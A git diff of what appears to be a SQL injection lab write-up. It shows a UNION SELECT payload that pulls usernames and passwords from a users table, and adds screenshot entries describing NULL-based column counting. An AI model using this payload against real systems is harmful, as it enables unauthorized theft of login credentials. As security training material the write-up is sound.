@@ -30,3 +30,9 @@ Utilize an input field vulnerable to SQL Injection to extract user login credent
 - **Payload Used:**  
   ```sql
   ' UNION SELECT username, password FROM users--  
+
+### 3.**Screenshots**
+-Screenshot of NULL,NULL,NULL-- getting column count.
+![Screenshot 2025-03-02 085702](https://github.com/user-attachments/assets/c3118754-2679-4498-8499-dd92eef33673)
+-Screnshot of NULL,'das'.NULL-- finding which column data can be extracted from.
+![Screenshot 2025-03-02 085809](https://github.com/user-attachments/assets/a379833d-1e99-446b-a4c0-39b88b43d94b)
